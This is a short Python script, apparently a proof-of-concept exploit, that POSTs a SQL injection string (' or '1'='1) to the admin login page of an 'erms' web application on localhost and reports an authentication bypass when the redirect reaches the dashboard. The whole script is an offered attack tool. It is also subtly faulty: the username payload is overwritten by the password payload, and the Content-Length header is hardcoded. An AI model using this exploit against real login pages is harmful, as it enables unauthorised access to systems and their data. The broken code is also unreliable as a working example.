import requests, re

headers = {
"Host": "127.0.0.1",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "78",
"Origin": "http://127.0.0.1",
"Connection": "close",
"Referer": "http://127.0.0.1/erms/admin/index.php",
"Cookie": "PHPSESSID=qrfi4a6ic65l1vc39c50mfr8m2",
"Upgrade-Insecure-Requests": "1",
}
url="http://127.0.0.1/erms/admin/index.php"
payload = "username=%27or%271%27%3D%271"
payload = "Password=%27or%271%27%3D%271"
pattern = "dashboard"
response = requests.request("POST", url, data=payload, headers=headers)
if response.history:
	for resp in response.history:
		try:
			resp1 = requests.get(resp.url)
			if (resp1.status_code == 200) and (re.findall(pattern , resp.url)):
				print ("[+] Authentication Bypassed Sucessfully using Payload = " +payload)
		except requests.exceptions.HTTPError as err:
			print(err)
else:
	print("[!] Something went wrong")
